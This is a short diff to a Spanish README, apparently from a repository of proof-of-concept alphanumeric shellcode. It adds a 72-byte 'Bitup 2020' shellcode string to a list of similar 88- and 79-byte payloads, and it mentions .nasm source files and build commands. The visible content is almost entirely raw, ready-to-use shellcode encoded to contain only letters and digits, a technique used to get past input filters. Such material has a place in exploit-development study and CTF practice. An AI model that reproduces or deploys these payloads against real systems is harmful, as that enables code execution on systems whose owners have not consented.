@@ -3,6 +3,7 @@ PoC Shellcode alfanumerico (Solo numeros y letras (mayúsculas y minúsculas)) p
   
 Shellcode (88 bytes): `HHDDDDfj0Y0H0fhzzYAAAAAA0HX0hY0HYDPhu12ZX5ZBZZlPhu834X5ZZZZPTYhjaaaX5aaaaP4a4jPPQTUVWaMz`  
 Shellcode PoC (79 bytes): `hzzzzYAAAAAA0HM0hN0HNhu12ZX5ZBZZPhu834X5ZZZZPTYhjaaaX5aaaaP5aaaa5jaaaPPQTUVWaMz`  
+Shellcode Bitup 2020 (72 bytes): `fhz0YAAAAAA0HF0hG0HGhu12ZX5ZBZZPhu834X5ZZZZPTYh9000X52000P4249PPQTUVWaM0`  
   
 Los archivos .nasm tienen el código de cada shellcode junto a su comando para compilarlos.  
 Se pueden diferenciar los siguientes shellcodes:  
